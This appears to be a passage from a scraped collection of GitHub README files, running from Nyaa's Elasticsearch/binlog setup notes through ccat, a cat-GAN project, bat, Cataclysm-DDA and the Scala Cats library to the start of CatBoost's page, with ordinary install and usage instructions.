MySQL Binlogging\n\nEdit your MariaDB/MySQL server configuration and add the following under [mariadb]:\nlog-bin\nserver_id=1\nlog-basename=master1\nbinlog-format=row\n\n\nRestart MariaDB/MySQL (sudo service mysql restart)\nCopy the example configuration (es_sync_config.example.json) as es_sync_config.json and adjust options in it to your liking (verify the connection options!)\nConnect to mysql as root\n\nVerify that the result of SHOW VARIABLES LIKE 'binlog_format'; is ROW\nExecute GRANT REPLICATION SLAVE ON *.* TO 'username'@'localhost'; to allow your configured user access to the binlog\n\n\n\nSetting up ES\n\nRun ./create_es.sh to create the indices for the torrents: nyaa and sukebei\n\nThe output should show acknowledged: true twice\n\n\nStop the Nyaa app if you haven't already\nRun python import_to_es.py to import all the torrents (on nyaa and sukebei) into the ES indices.\n\nThis may take some time to run if you have plenty of torrents in your database.\n\n\n\nEnable the USE_ELASTIC_SEARCH flag in config.py and (re)start the application.\nElasticsearch should now be functional! The ES indices won't be updated \"live\" with the current setup, continue below for instructions on how to hook Elasticsearch up to MySQL binlog.\nHowever, take note that binglog is not necessary for simple ES testing and development; you can simply run import_to_es.py from time to time to reindex all the torrents.\nSetting up sync_es.py\nsync_es.py keeps the Elasticsearch indices updated by reading the binlog and pushing the changes to the ES indices.\n\nMake sure es_sync_config.json is configured with the user you grated the REPLICATION permissions\nRun import_to_es.py and copy the outputted JSON into the file specified by save_loc in your es_sync_config.json\nRun sync_es.py as-is or, for actual deployment, set it up as a service and run it, preferably as the system/root\n\nMake sure sync_es.py runs within the venv with the right dependencies!\n\n\n\nYou're done! The script should now be feeding updates from the database to Elasticsearch.\nTake note, however, that the specified ES index refresh interval is 30 seconds, which may feel like a long time on local development. Feel free to adjust it or poke Elasticsearch yourself!"}, {"title": "jingweno/ccat", "language": "Go", "content": "ccat\n\n\nccat is the colorizing cat. It works similar to cat but displays content with syntax highlighting.\nSupported Languages\n\nJavaScript\nJava\nRuby\nPython\nGo\nC\nJSON\n\nInstallation\nOSX\n$ brew install ccat\n\nArch Linux\n$ pacaur -S ccat\n$ pacaur -S ccat-git\n\nThe ccat package will reflect the current release snapshot, while the ccat-git will be based on the current source available in the master branch of the git repo. You can use any AUR helper in place of pacaur AUR Helpers\nStandalone\nccat can be easily installed as an executable.\nDownload the latest compiled binaries and put it in your executable path.\nFrom source\nPrerequisites:\n\nGit\nGo 1.4+\n\n$ go get -u github.com/jingweno/ccat\n\nCompletion (ZSH Only)\nInstallation\nMove the _ccat file in ./completions/zsh to your site-functions directory usually in /usr/local/share/zsh/site-functions or in /usr/share/zsh/site-functions. If completions don't work on the next ZSH startup, you can delete the file .zcompdump (which caches autocomplete commands) and it is usually in the home directory.\nUninstallation\nGo back to the directory you copied _ccat to and delete the file, then simply delete .zcompdump in order to stop errors when trying to use ccat autocomplete afterwards.\nUsage\n$ ccat FILE1 FILE2 ...\n$ ccat FILE1 FILE2 ... --html # output in HTML\n$ ccat --bg=dark FILE1 FILE 2 ... # dark background\n$ ccat -G String=\"_darkblue_\" -G Plaintext=\"darkred\" FILE # set color codes\n$ ccat --palette # show palette\n$ ccat # read from standard input\n$ curl https://raw.githubusercontent.com/jingweno/ccat/master/main.go | ccat\n\nIt's recommended to alias ccat to cat:\nalias cat=ccat\n\nThe overhead of ccat comparing to cat is mimimum:\n$ wc -l main.go\n123 main.go\n$ time cat main.go > /dev/null\ncat main.go > /dev/null  0.00s user 0.00s system 61% cpu 0.005 total\n$ time ccat main.go > /dev/null\nccat main.go > /dev/null  0.00s user 0.00s system 78% cpu 0.007 total\n\nYou can always invoke cat after aliasing ccat by typing \\cat.\nDemo\n\nRoadmap\n\n nicer default color scheme\n ?\n\nAlternatives\nccat is designed to be distributed in one binary, run at native speed\nand follow the POSIX standards. There're alternatives out there.\nUse them at your own risk :):\n\npygments\nsource-highlight\n\nLicense\nMIT\nCredits\nThanks to Sourcegraph who built this awesome syntax-highlighting package.\nSupport\nBackers\nSupport us with a monthly donation and help us continue our activities. [Become a backer]\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSponsors\nBecome a sponsor and get your logo on our README on Github with a link to your site. [Become a sponsor]"}, {"title": "AlexiaJM/Deep-learning-with-cats", "language": "Python", "content": "Deep-learning-with-cats\nThis repository is a \"toy\" project so I can gain experience building deep neural networks. My first goal is generating pictures of cats using Generative Adversarial Networks. My second goal is making art with cats by applying styles to pictures of cats using deep convolutional neural networks. (^._.^)\nUpdate (2018/11/02): See https://github.com/AlexiaJM/RelativisticGAN for a greatly enhanced version of the GAN codes, that incorporate all loss functions into a single file. It also includes additional better relativistic loss functions and many extra features (ex: Spectral normalization, Hinge Loss, Gradient penalty with any GAN loss, generate pictures every X iteration, learning rate decay, etc.). It still works by default to generate cats but it can also do CIFAR-10.\n**2019/03/02: This contains a even more recent version of the code with even more features: https://github.com/AlexiaJM/relativistic-f-divergences\n\nObjectives\n\nGenerate images of cats using various types of Generative Adversarial Networks (GAN)\n\nuse DCGAN (Done)\nuse WGAN (Done)\nuse WGAN-GP (Done)\nuse LSGAN (Done)\nuse BEGAN\n\n\nTransform real cats into art pieces\n\nuse CycleGAN\nuse Fast neural style (Done)\n\n\nVarious/Others\n\nTry adding Frechet Inception Distance (FID) as per https://arxiv.org/pdf/1706.08500.pdf\nTry soft and noisy labels as per https://github.com/soumith/ganhacks\nTry adding decaying noise to input as per https://github.com/soumith/ganhacks\n\n\n\nNeeded\n\nPython 3.6, PyTorch, Tensorflow (for TensorBoard)\nCat Dataset (https://web.archive.org/web/20150703060412/http://137.189.35.203/WebUI/CatDatabase/catData.html or http://academictorrents.com/details/c501571c29d16d7f41d159d699d0e7fb37092cbd)\nTensorBoard logger (https://github.com/TeamHG-Memex/tensorboard_logger)\n\nTo run\n$ # Download dataset and preprocess cat pictures \n$ # Create two folders, one for cats bigger than 64x64 and one for cats bigger than 128x128\n$ sh setting_up_script.sh\n$ # Move to your favorite place\n$ mv cats_bigger_than_64x64 \"your_input_folder_64x64\"\n$ mv cats_bigger_than_128x128 \"your_input_folder_128x128\"\n$ # Generate 64x64 cats using DCGAN\n$ python DCGAN.py --input_folder \"your_input_folder_64x64\" --output_folder \"your_output_folder\"\n$ # Generate 128x128 cats using DCGAN\n$ python DCGAN.py --input_folder=\"your_input_folder_128x128\" --image_size 128 --G_h_size 64 --D_h_size 64 --SELU True\n$ # Generate 64x64 cats using WGAN\n$ python WGAN.py --input_folder \"your_input_folder_64x64\" --output_folder \"your_output_folder\"\n$ # Generate 64x64 cats using WGAN-GP\n$ python WGAN-GP.py --input_folder \"your_input_folder_64x64\" --output_folder \"your_output_folder\" --SELU True\n$ # Generate 64x64 cats using LSGAN (Least Squares GAN)\n$ python LSGAN.py --input_folder \"your_input_folder_64x64\" --output_folder \"your_output_folder\"\nTo see TensorBoard plots of the losses\n$ tensorboard --logdir \"your_input_folder\"\nResults\nDiscussion of the results at https://ajolicoeur.wordpress.com/cats.\nDCGAN 64x64\n\nDCGAN 128x128 with SELU\n\nWGAN 64x64\n\nWGAN-GP 64x64 with SELU\n\nFast style transfer"}, {"title": "sharkdp/bat", "language": "Rust", "content": "A cat(1) clone with syntax highlighting and Git integration.\n\n\nKey Features \u2022\n  How To Use \u2022\n  Installation \u2022\n  Customization \u2022\n  Project goals, alternatives \u2022\n  Translation [\u4e2d\u6587][\u65e5\u672c\u6587]\n\nSyntax highlighting\nbat supports syntax highlighting for a large number of programming and markup\nlanguages:\n\nGit integration\nbat communicates with git to show modifications with respect to the index\n(see left side bar):\n\nShow non-printable characters\nYou can use the -A/--show-all option to show and highlight non-printable\ncharacters:\n\nAutomatic paging\nbat can pipe its own output to less if the output is too large for one screen.\nFile concatenation\nOh.. you can also use it to concatenate files \ud83d\ude09. Whenever\nbat detects a non-interactive terminal (i.e. when you pipe into another process\nor into a file), bat will act as a drop-in replacement for cat and\nfall back to printing the plain file contents.\nHow to use\nDisplay a single file on the terminal\n> bat README.md\nDisplay multiple files at once\n> bat src/*.rs\nRead from stdin, determine the syntax automatically\n> curl -s https://sh.rustup.rs | bat\nRead from stdin, specify the language explicitly\n> yaml2json .travis.yml | json_pp | bat -l json\nShow and highlight non-printable characters:\n> bat -A /etc/hosts\nUse it as a cat replacement:\nbat > note.md  # quickly create a new file\n\nbat header.md content.md footer.md > document.md\n\nbat -n main.rs  # show line numbers (only)\n\nbat f - g  # output 'f', then stdin, then 'g'.\nIntegration with other tools\nfind or fd\nYou can use the -exec option of find to preview all search results with bat:\nfind \u2026 -exec bat {} +\nIf you happen to use fd, you can use the -X/--exec-batch option to do the same:\nfd \u2026 -X bat\ntail -f\nbat can be combined with tail -f to continuously monitor a given file with syntax highlighting.\ntail -f /var/log/pacman.log | bat --paging=never -l log\nNote that we have to switch off paging in order for this to work. We have also specified the syntax\nexplicitly (-l log), as it can not be auto-detected in this case.\ngit show\nYou can combine bat with git show to view an older version of a given file with proper syntax\nhighlighting:\ngit show v0.6.0:src/main.rs | bat -l rs\nxclip\nThe line numbers and Git modification markers in the output of bat can make it hard to copy\nthe contents of a file. To prevent this, you can call bat with the -p/--plain option or\nsimply pipe the output into xclip:\nbat main.cpp | xclip\nbat will detect that the output is being redirected and print the plain file contents.\nInstallation\nOn Ubuntu\n... and other Debian-based Linux distributions.\nDownload the latest .deb package from the release page\nand install it via:\nsudo dpkg -i bat_0.10.0_amd64.deb  # adapt version number and architecture\nOn Arch Linux\nYou can install the bat package\nfrom the official sources:\npacman -S bat\nOn Fedora\nYou can install bat from the Fedora Modular repository. On Fedora 29 and higher, it is enabled by default. Otherwise, run dnf install fedora-repos-modular to set up, and make sure that the fedora-modular and fedora-updates-modular repos are enabled in /etc/yum.repos.d.\ndnf module install bat\nOn Void Linux\nYou can install bat via xbps-install:\nxbps-install -S bat\n\nOn FreeBSD\nYou can install a precompiled bat package with pkg:\npkg install bat\nor build it on your own from the FreeBSD ports:\ncd /usr/ports/textproc/bat\nmake install\nVia nix\nYou can install bat using the nix package manager:\nnix-env -i bat\nOn openSUSE\nYou can install bat with zypper:\nzypper install bat\n\nOn macOS\nYou can install bat with Homebrew:\nbrew install bat\nOn Windows\nYou can download prebuilt binaries from the Release page,\nor install it with scoop or Chocolatey:\nscoop install bat\nchoco install bat\nSee below for notes.\nVia Docker\nThere is a Docker image that you can use to run bat in a container:\ndocker pull danlynn/bat\nalias bat='docker run -it --rm -e BAT_THEME -e BAT_STYLE -e BAT_TABS -v \"$(pwd):/myapp\" danlynn/bat'\nVia Ansible\nYou can install bat with Ansible:\n# Install role on local machine\nansible-galaxy install aeimer.install_bat\n---\n# Playbook to install bat\n- host: all\n  roles:\n    - aeimer.install_bat\n\nAnsible Galaxy\nGitHub\n\nThis should work with the following distributions:\n\nDebian/Ubuntu\nARM (eg. Raspberry PI)\nArch Linux\nVoid Linux\nFreeBSD\nMacOS\n\nFrom binaries\nCheck out the Release page for\nprebuilt versions of bat for many different architectures. Statically-linked\nbinaries are also available: look for archives with musl in the file name.\nFrom source\nIf you want to build bat from source, you need Rust 1.31 or\nhigher. You can then use cargo to build everything:\ncargo install bat\nYou may have to install cmake and the libz development package\n(libz-dev or libz-devel) in order for the build to succeed.\nCustomization\nHighlighting theme\nUse bat --list-themes to get a list of all available themes for syntax\nhighlighting. To select the TwoDark theme, call bat with the\n--theme=TwoDark option or set the BAT_THEME environment variable to\nTwoDark. Use export BAT_THEME=\"TwoDark\" in your shell's startup file to\nmake the change permanent. Alternatively, use bats\nconfiguration file.\nIf you want to preview the different themes on a custom file, you can use\nthe following command (you need fzf for this):\nbat --list-themes | fzf --preview=\"bat --theme={} --color=always /path/to/file\"\nbat looks good on a dark background by default. However, if your terminal uses a\nlight background, some themes like GitHub or OneHalfLight will work better for you.\nYou can also use a custom theme by following the\n'Adding new themes' section below.\nOutput style\nYou can use the --style option to control the appearance of bats output.\nYou can use --style=numbers,changes, for example, to show only Git changes\nand line numbers but no grid and no file header. Set the BAT_STYLE environment\nvariable to make these changes permanent or use bats\nconfiguration file.\nAdding new syntaxes / language definitions\nbat uses the excellent syntect\nlibrary for syntax highlighting. syntect can read any\nSublime Text .sublime-syntax file\nand theme. To add new syntax definitions, do the following.\nCreate a folder with syntax definition files:\nmkdir -p \"$(bat --config-dir)/syntaxes\"\ncd \"$(bat --config-dir)/syntaxes\"\n\n# Put new '.sublime-syntax' language definition files\n# in this folder (or its subdirectories), for example:\ngit clone https://github.com/tellnobody1/sublime-purescript-syntax\nNow use the following command to parse these files into a binary cache:\nbat cache --build\nFinally, use bat --list-languages to check if the new languages are available.\nIf you ever want to go back to the default settings, call:\nbat cache --clear\nAdding new themes\nThis works very similar to how we add new syntax definitions.\nFirst, create a folder with the new syntax highlighting themes:\nmkdir -p \"$(bat --config-dir)/themes\"\ncd \"$(bat --config-dir)/themes\"\n\n# Download a theme in '.tmTheme' format, for example:\ngit clone https://github.com/greggb/sublime-snazzy\n\n# Update the binary cache\nbat cache --build\nFinally, use bat --list-themes to check if the new themes are available.\nUsing a different pager\nbat uses the pager that is specified in the PAGER environment variable. If this variable is not\nset, less is used by default. If you want to use a different pager, you can either modify the\nPAGER variable or set the BAT_PAGER environment variable to override what is specified in\nPAGER.\nIf you want to pass command-line arguments to the pager, you can also set them via the\nPAGER/BAT_PAGER variables:\nexport BAT_PAGER=\"less -RF\"\nInstead of using environment variables, you can also use bats configuration file to configure the pager (--pager option).\nNote: By default, if the pager is set to less (and no command-line options are specified),\nbat will pass the following command line\noptions to the pager: -R/--RAW-CONTROL-CHARS, -F/--quit-if-one-screen and -X/--no-init.\nThe first (-R) is needed to interpret ANSI colors correctly. The second option (-F) instructs\nless to exit immediately if the output size is smaller than the vertical size of the terminal.\nThis is convenient for small files because you do not have to press q to quit the pager. The\nthird option (-X) is needed to fix a bug with the --quit-if-one-screen feature in old versions\nof less. Unfortunately, it also breaks mouse-wheel support in less. If you want to enable\nmouse-wheel scrolling, you can either pass just -R (as in the example above, this will disable\nthe quit-if-one-screen feature), or you can use a recent version of less and pass -RF which\nwill hopefully enable both quit-if-one-screen and mouse-wheel scrolling.\nIf scrolling still doesn't work for you, you can try to pass the -S option in addition.\nConfiguration file\nbat can also be customized with a configuration file. The location of the file is dependent\non your operating system. To get the default path for your system, call\nbat --config-file\n\nAlternatively, you can use the BAT_CONFIG_PATH environment variable to point bat to a\nnon-default location of the configuration file:\nexport BAT_CONFIG_PATH=\"/path/to/bat.conf\"\nFormat\nThe configuration file is a simple list of command line arguments. Use bat --help to see a full list of possible options and values. In addition, you can add comments by prepending a line with the # character.\nExample configuration file:\n# Set the theme to \"TwoDark\"\n--theme=\"TwoDark\"\n\n# Show line numbers, Git modifications and file header (but no grid)\n--style=\"numbers,changes,header\"\n\n# Use italic text on the terminal (not supported on all terminals)\n--italic-text=always\n\n# Add mouse scrolling support in less (does not work with older\n# versions of \"less\")\n--pager=\"less -FR\"\n\n# Use C++ syntax (instead of C) for .h header files\n--map-syntax h:cpp\n\n# Use \"gitignore\" highlighting for \".ignore\" files\n--map-syntax .ignore:.gitignore\nUsing bat on Windows\nbat mostly works out-of-the-box on Windows, but a few features may need extra configuration.\nPaging\nWindows only includes a very limited pager in the form of more. You can download a Windows binary\nfor less from its homepage or through\nChocolatey. To use it, place the binary in a directory in\nyour PATH or define an environment variable. The Chocolatey package installs less automatically.\nColors\nWindows 10 natively supports colors in both conhost.exe (Command Prompt) and PowerShell since\nv1511, as\nwell as in newer versions of bash. On earlier versions of Windows, you can use\nCmder, which includes ConEmu.\nNote: The Git and MSYS versions of less do not correctly interpret colors on Windows. If you\ndon\u2019t have any other pagers installed, you can disable paging entirely by passing --paging=never\nor by setting BAT_PAGER to an empty string.\nCygwin\nbat on Windows does not natively support Cygwin's unix-style paths (/cygdrive/*). When passed an absolute cygwin path as an argument, bat will encounter the following error: The system cannot find the path specified. (os error 3)\nThis can be solved by creating a wrapper or adding the following function to your .bash_profile file:\nbat() {\n    local index\n    local args=(\"$@\")\n    for index in $(seq 0 ${#args[@]}) ; do\n        case \"${args[index]}\" in\n        -*) continue;;\n        *)  [ -e \"${args[index]}\" ] && args[index]=\"$(cygpath --windows \"${args[index]}\")\";;\n        esac\n    done\n    command bat \"${args[@]}\"\n}\nTroubleshooting\nTerminals & colors\nbat handles terminals with and without truecolor support. However, the colors in the syntax\nhighlighting themes are not optimized for 8-bit colors and it is therefore strongly recommended\nthat you use a terminal with 24-bit truecolor support (terminator, konsole, iTerm2, ...).\nSee this article for more details and a full list of\nterminals with truecolor support.\nMake sure that your truecolor terminal sets the COLORTERM variable to either truecolor or\n24bit. Otherwise, bat will not be able to determine whether or not 24-bit escape sequences\nare supported (and fall back to 8-bit colors).\nLine numbers and grid are hardly visible\nPlease try a different theme (see bat --list-themes for a list). The OneHalfDark and\nOneHalfLight themes provide grid and line colors that are brighter.\nDevelopment\n# Recursive clone to retrieve all submodules\ngit clone --recursive https://github.com/sharkdp/bat\n\n# Build (debug version)\ncd bat\ncargo build\n\n# Run unit tests and integration tests\ncargo test\n\n# Install (release version)\ncargo install\n\n# Build a bat binary with modified syntaxes and themes\nbash assets/create.sh\ncargo install -f\nProject goals and alternatives\nbat tries to achieve the following goals:\n\nProvide beautiful, advanced syntax highlighting\nIntegrate with Git to show file modifications\nBe a drop-in replacement for (POSIX) cat\nOffer a user-friendly command-line interface\n\nThere are a lot of alternatives, if you are looking for similar programs. See\nthis document for a comparison."}, {"title": "CleverRaven/Cataclysm-DDA", "language": "C++", "content": "Cataclysm: Dark Days Ahead\nCataclysm: Dark Days Ahead is a roguelike set in a post-apocalyptic world. While some have described it as a \"zombie game\", there is far more to Cataclysm than that. Struggle to survive in a harsh, persistent, procedurally generated world. Scavenge the remnants of a dead civilization for food, equipment, or, if you are lucky, a vehicle with a full tank of gas to get you the hell out of Dodge. Fight to defeat or escape from a wide variety of powerful monstrosities, from zombies to giant insects to killer robots and things far stranger and deadlier, and against the others like yourself, who want what you have...\nDownload\nVisit our website for download links to all stable and experimental releases.\nThe source can either be downloaded as an archive, or you can clone it from our GitHub repository.\nCompile\nPlease read COMPILING.md - it covers general information and more specific recipes for Linux, OS X, Windows and BSD. See doc/COMPILER_SUPPORT.md for details on which compilers we support. And you can always dig for more information in doc/.\nWe also have the following build guides:\n\nBuilding on Windows with MSYS2 at COMPILING-MSYS.md\nBuilding on Windows with vcpkg at COMPILING-VS-VCPKG.md\nBuilding with cmake at COMPILING-CMAKE.md  (unofficial guide)\n\nContribute\nCataclysm:Dark Days Ahead is the result of contributions from over 800 volunteers under the Creative Commons Attribution ShareAlike 3.0 license. The code and content of the game is free to use, modify, and redistribute for any purpose whatsoever. See http://creativecommons.org/licenses/by-sa/3.0/ for details.\nSome code distributed with the project is not part of the project and is released under different software licenses, the files covered by different software licenses have their own license notices.\n\nPlease see CONTRIBUTING.md for details.\nCommunity\nForums:\nhttps://discourse.cataclysmdda.org\nWiki:\nhttp://cddawiki.chezzo.com/cdda_wiki/index.php\nGitHub repo:\nhttps://github.com/CleverRaven/Cataclysm-DDA\nIRC:\nirc.freenode.net ; #CataclysmDDA\nhttp://webchat.freenode.net/?channels=#CataclysmDDA\nFrequently Asked Questions\nIs there a tutorial?\nYes, you can find the tutorial in the Special menu at the main menu (be aware that due to many code changes the tutorial may not function). You can also access documentation in-game via the ? key.\nHow can I change the key bindings?\nPress the ? key, followed by the 1 key to see the full list of key commands. Press the + key to add a key binding, select which action with the corresponding letter key a-w, and then the key you wish to assign to that action.\nHow can I start a new world?\nWorld on the main menu will generate a fresh world for you. Select Create World.\nI've found a bug / I would like to make a suggestion. What should I do?\nPlease submit an issue on our GitHub page. If you're not able to, send an email to kevin.granade@gmail.com."}, {"title": "typelevel/cats", "language": "Scala", "content": "Community Announcements \n\nApr 26 2019 We launched a sustainability program. Please consider supporting us.\nApr 25 2019 Cats 2.0.0-M1 is released with binary compatibility with 1.x on cats-kernel, cats-core and cats-free\nFeb 15 2019 Cats 2019 roadmap is published.\nJan 31 2019 Cats 1.6.0 is released.\nJan 31 2019 Cats ecosystem community survey 2018 results is published\n\nCats\n\n\n\n\n\n\n\n\nOverview\nCats is a library which provides abstractions for functional programming in the Scala programming language.\nThe name is a playful shortening of the word category.\nScala supports both object-oriented and functional programming, and this is reflected in the hybrid approach of the\nstandard library. Cats strives to provide functional programming abstractions that are core, binary compatible, modular, approachable and efficient. A broader goal of Cats is to provide a foundation for an ecosystem of pure, typeful libraries to support functional programming in Scala applications.\nFor more detail about Cats' motivations, go here.\nGetting Started\nCats is currently available for Scala 2.10 (up to 1.2.x), 2.11,  2.12, 2.13.0-RC1, and Scala.js.\nCats relies on improved type inference via the fix for SI-2712, which is not enabled by default. For Scala 2.11.9 or later you should add the following to your build.sbt:\nscalacOptions += \"-Ypartial-unification\"\nOr, if you need to support older versions of Scala you can use the sbt-partial-unification plugin which extends support back through Scala 2.10.6 or later, to add it, simply add this line to your plugins.sbt:\naddSbtPlugin(\"org.lyranthe.sbt\" % \"partial-unification\" % \"1.1.2\")\nAnd then create the Cats dependency, by adding the following to your build.sbt:\nlibraryDependencies += \"org.typelevel\" %% \"cats-core\" % \"2.0.0-M1\"\nThis will pull in the cats-core module. If you require some other\nfunctionality, you can pick-and-choose from amongst these modules\n(used in place of \"cats-core\"):\n\ncats-macros: Macros used by Cats syntax (required).\ncats-kernel: Small set of basic type classes (required).\ncats-core: Most core type classes and functionality (required).\ncats-laws: Laws for testing type class instances.\ncats-free: Free structures such as the free monad, and supporting type classes.\ncats-testkit: lib for writing tests for type class instances using laws.\nalleycats-core: Cats instances and classes which are not lawful.\n\nThere are several other Cats modules that are in separate repos so that they can\nmaintain independent release cycles.\n\ncats-effect: standard IO type together with Sync, Async and Effect type classes\ncats-mtl: transformer typeclasses for Cats' Monads, Applicatives and Functors.\nmouse: a small companion to Cats that provides convenient syntax (aka extension methods)\nkittens: automatic type class instance derivation for Cats and generic utility functions\ncats-tagless: Utilities for tagless final encoded algebras\ncats-collections: Data structures which facilitate pure functional programming\n\nPast release notes for Cats are available in CHANGES.md.\nSee Cats 2019 roadmap for our plan for 2019.\nDocumentation\nLinks:\n\nWebsite: typelevel.org/cats/\nScalaDoc: typelevel.org/cats/api/\nType classes: typelevel.org/cats/typeclasses\nData types: typelevel.org/cats/datatypes.html\nGlossary: typelevel.org/cats/nomenclature.html\nResources for Learners: typelevel.org/cats/resources_for_learners.html\nFAQ: typelevel.org/cats/faq.html\n\nThe Cats ecosystem\nBy sharing the same set of type classes, instances and data types provided by Cats, projects can speak the same \"Cats language\", and integrate with each other with ease.\nGeneral purpose libraries to support pure functional programming\n\ncats-par: Abstract type member Parallel instances\ncats-retry: composable retry logic for Cats and Cats Effect\ndroste: recursion schemes for Cats\nDsl.scala: The !-notation for creating Cats monadic expressions\neff: functional effects and effect handlers (alternative to monad transformers)\nFreestyle: pure functional framework for Free and Tagless Final apps & libs\niota: Fast [co]product types with a clean syntax\nMonocle: an optics library for Scala (and Scala.js) strongly inspired by Haskell Lens.\nnewts: Defines newtypes compatible with Cats type classes\norigami: monadic folds\nrefined: simple refinement types for Scala\nshims: seamless interoperability for cats and scalaz typeclasses and datatypes\n\nLibraries with more specific uses\n\natto: friendly little text parsers\ncats-scalacheck: cats typeclass instances for scalacheck\ncats-time: cats typeclass instances for java time\ncirce: pure functional JSON library\nCiris: Lightweight, extensible, and validated configuration loading in Scala\ncormorant: CSV handling library for FP\ndecline: A composable command-line parser\ndoobie: a pure functional JDBC layer for Scala\nextruder: Populate case classes from any data source\nfastparse-cats: cats Monad and Alternative instances for fastparse\nFetch: efficient data access to heterogeneous data sources\nfinch: Scala combinator library for building Finagle HTTP services\nFrameless: Expressive types for Spark\nFS2: compositional, streaming I/O library\nfuuid: functional uuid's\ngithub4s: wrapper around the GitHub API\ngrafter: dependency-injection library using the Reader pattern\ngsheets4s: wrapper around the Google Sheets API\nhammock: Purely functional HTTP client\nhenkan: Type safe conversion between case class instances with similar fields\nhttp4s: A minimal, idiomatic Scala interface for HTTP\nitto-csv: pure functional library for working with CSV\nlinebacker: functional thread pool management\nlog4cats: functional logging\nmonadic-html: Tiny DOM binding library for Scala.js\nMonix: high-performance library for composing asynchronous and event-based programs\npureconfig: A boilerplate-free library for loading configuration files\nrainier: Bayesian inference in Scala\nscala-forex: exchange rate lookups\nscala-maxmind-ip-lookups: IP geolocation through the Maxmind database\nscala-referer-parser: referer parsing\nscala-weather: weather lookups\nscanamo: simpler DynamoDB access for Scala\nseals: tools for schema evolution and language-integrated schemata\nsup: Composable, purely functional healthchecks in Scala\ntsec: Typesafe, functional, general purpose cryptography and security library\n\nYour project talks cats too? Submit a PR to add it here!\nThe full-size Cats logo is available for use for Cats related projects, contents, souvenirs, etc.\nWe offer a Cats Friendly Badge to let others know your project works with Cats!\n\nBelow are quick html and markdown snippets to use the badge in your own project.\n<a href=\"https://typelevel.org/cats/\"><img src=\"https://typelevel.org/cats/img/cats-badge-tiny.png\" alt=\"Cats friendly\" /></a>\n![Cats Friendly Badge](https://typelevel.org/cats/img/cats-badge-tiny.png) \nHow can I contribute to Cats?\nWe welcome contributions to Cats and would love for you to help build\nCats. See our contributor guide for more\ninformation about how you can get involved.\nYou can also support us by talking to your employer about supporting the OSS libraries they are using. We have a sustainability program that supports the maintenance and development of Cats.\nCommunity\nDiscussion around Cats is currently happening on Github issue and PR pages\nas well as in two Gitter channels:\nGitter channel cats is for general user\nquestions and discussions, and\nGitter channel cats-dev\nis dedicated for Cats development related discussions. For people who wants to\nfollow closely and/or to participate in the decisions in Cats development,\nthis is the room to join.\nYou can get an overview of who is working on what\nvia Waffle.io.\nPeople are expected to follow the\nScala Code of Conduct when\ndiscussing Cats on the Github page, Gitter channel, or other\nvenues.\nWe hope that our community will be respectful, helpful, and kind. If\nyou find yourself embroiled in a situation that becomes heated, or\nthat fails to live up to our expectations, you should disengage and\ncontact one of the project maintainers in private. We\nhope to avoid letting minor aggressions and misunderstandings escalate\ninto larger problems.\nIf you are being harassed, please contact one of us\nimmediately so that we can support you.\nBinary compatibility and versioning\nAfter 1.0.0 release, we decided\nto use MAJOR.MINOR.PATCH Semantic Versioning 2.0.0\ngoing forward, which is different from the EPOCH.MAJOR.MINOR scheme common among\nJava and Scala libraries (including the Scala lang).\nCats strives to provide a solid and stable foundation for an ecosystem of\nFP libraries. Thus, we treat backward binary compatibility maintenance with a high priority.\nIn semantic versioning, backward breaking change is ONLY allowed between MAJOR versions.\nWe will maintain backward binary compatibility between PATCH AND MINOR versions.\nFor example, when we release Cats 1.1.0, it will be backward binary compatible\nwith the previous 1.0.x versions. I.E. the new JAR will be a drop-in replacement for\nthe old one. This is critical when your application has a diamond\ndependency on Cats - depending on two or more libraries that all depend on Cats.\nIf one library upgrades to the new 1.1.0 Cats before the other one does, your\napplication still runs thanks to this backward binary compatibility.\nAlso worth noting is that according to semantic versioning,\nMINOR version Y (x.Y.z | x > 0) MUST be incremented\nif new, backwards compatible functionality is introduced to the public API.\nIt MUST be incremented if any public API functionality is marked as deprecated.\nAny binary breaking changes will require a MAJOR version bump, which we will be very\ncautious about. We will also consider using organization and package name for major\nversioning in the future. But that decision is yet to be made.\nAdopters\nHere's a (non-exhaustive) list of companies that use Cats in production. Don't see yours? You can add it in a PR!\n\nAbacus Protocol\nAnduin Transactions\nApple Inc. (FEAR team)\nAutoScout24\nAvast\nBabylonHealth\nBanno Group inside of Jack Henry & Associates\nBasefarm\nbuildo\nCodacy\nCodecentric\nColisweb\nDriveTribe\nDwolla\nEarnest\neBay Inc.\nEloquentix\neSailors\nEvolution Gaming\nEvotor Marketplace\ne.near\nE.ON\nformation.ai\nFree2Move\nHomeAway\niHeartRadio\nImmobilienScout24\nITV\nLookout\nMetacommerce\nNetflix\nNezasa\nNCR Edinburgh\nOcado Technology\nPacklink\nRaiffeisenbank Russia\nRakuten\nREA Group\nReality Games\nRudder\nScalac\nScala Center\nSigma\nSnowplow Analytics\nSpiceworks\nSpotahome\nSpotify\nSpringerNature\nSRF\nStripe\nTecsisa\nTeikametrics\nThe Guardian\nUnderscore Consulting\nWegtam GmbH\nWeWork\nWix.com\nZalando\n47 Degrees\n\nMaintainers\nThe current maintainers (people who can merge pull requests) are:\n\nceedubs Cody Allen\nrossabaker Ross Baker\njohnynek P. Oscar Boykin\ntravisbrown Travis Brown\nadelbertc Adelbert Chang\nLukaJCB Luka Jacobowitz\npeterneyens Peter Neyens\ntpolecat Rob Norris\nnon Erik Osheim\nmpilquist Michael Pilquist\nmilessabin Miles Sabin\ndjspiewak Daniel Spiewak\nfthomas Frank Thomas\njulien-truffaut Julien Truffaut\nkailuowang Kailuo Wang\n\nWe are currently following a practice of requiring at least two\nsign-offs to merge PRs (and for large or contentious issues we may\nwait for more). For typos or other small fixes to documentation we\nrelax this to a single sign-off.\nCopyright and License\nAll code is available to you under the MIT license, available at\nhttp://opensource.org/licenses/mit-license.php and also in the\nCOPYING file. The design is informed by many other\nprojects, in particular Scalaz.\nCopyright the maintainers, 2015-2019."}, {"title": "catboost/catboost", "language": "C++", "content": "Website |\nDocumentation |\nInstallation |\nRelease Notes\n\n\n\n\n\nCatBoost is a machine learning method based on gradient boosting over decision trees.\nMain advantages of CatBoost:\n\nSuperior quality when compared with other GBDT libraries on many datasets.\nBest in class prediction speed.\nSupport for both numerical and categorical features.\nFast GPU and multi-GPU support for training out of the box.\nVisualization tools included.\n\nGradient Boosting Survey\nWe want to make the best Gradient Boosting library in the world. Please, help us to do so! Complete our survey to help us understand what is important for GBDT users.\nGet Started and Documentation\nAll CatBoost documentation is available here.\nInstall CatBoost by following the guide for the\n\nPython package\nR-package\ncommand line\n\nNext you may want to investigate:\n\nTutorials\n[Training modes and metrics] 